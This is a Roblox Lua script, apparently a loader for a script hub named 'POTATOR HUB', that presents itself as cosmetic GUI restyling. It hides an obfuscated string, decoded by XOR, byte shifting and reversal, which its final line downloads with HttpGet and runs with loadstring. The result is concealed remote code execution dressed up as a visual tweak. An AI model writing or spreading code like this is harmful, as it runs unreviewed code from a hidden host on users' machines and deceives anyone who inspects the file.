
--[[ STAGE 2: VISUAL CORE ]]
local E2KGaSXcWgmupAsy9w="\233\021\001\251\030\233\243\016\088\033\016\032\092\031\030\019\097\034\032\024\030\048\042\029\047\105\106\120\048\052\057\058\047"local zmZmvHiCVoIQ0tLVX_U3=195 local UXgy7hflhbpO4AXRFGhc=91 local dAauY4BiijAAiUBq=0 local imReH8lJE7T0T=1 local JTX5zdo0ufs9vf4U=8 local hOvc0T7IOiwka85si8Hsde=true local Vo8hhIo9AkSCwHAfbFZ=bit32 and bit32.bxor if not Vo8hhIo9AkSCwHAfbFZ then Vo8hhIo9AkSCwHAfbFZ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local OYt_PP4MHoOdeqT={}for xmSVlPHBj5J2hd2U=1,#E2KGaSXcWgmupAsy9w do local xDUBjstocpeIsoA=string.byte(E2KGaSXcWgmupAsy9w,xmSVlPHBj5J2hd2U)local oGck6_3_hpZf=(UXgy7hflhbpO4AXRFGhc+(xmSVlPHBj5J2hd2U*imReH8lJE7T0T)+JTX5zdo0ufs9vf4U)%256 if dAauY4BiijAAiUBq==0 then xDUBjstocpeIsoA=(xDUBjstocpeIsoA-oGck6_3_hpZf)%256 OYt_PP4MHoOdeqT[xmSVlPHBj5J2hd2U]=string.char(Vo8hhIo9AkSCwHAfbFZ(xDUBjstocpeIsoA,zmZmvHiCVoIQ0tLVX_U3))else xDUBjstocpeIsoA=Vo8hhIo9AkSCwHAfbFZ(xDUBjstocpeIsoA,zmZmvHiCVoIQ0tLVX_U3)OYt_PP4MHoOdeqT[xmSVlPHBj5J2hd2U]=string.char((xDUBjstocpeIsoA-oGck6_3_hpZf)%256)end end local eCB3cseRtCeEz11iU=table.concat(OYt_PP4MHoOdeqT)if hOvc0T7IOiwka85si8Hsde then eCB3cseRtCeEz11iU=string.reverse(eCB3cseRtCeEz11iU)end local KJzoLqFnEV05sPpqYR5REH=eCB3cseRtCeEz11iU
local HubName = "POTATOR HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(KJzoLqFnEV05sPpqYR5REH))()
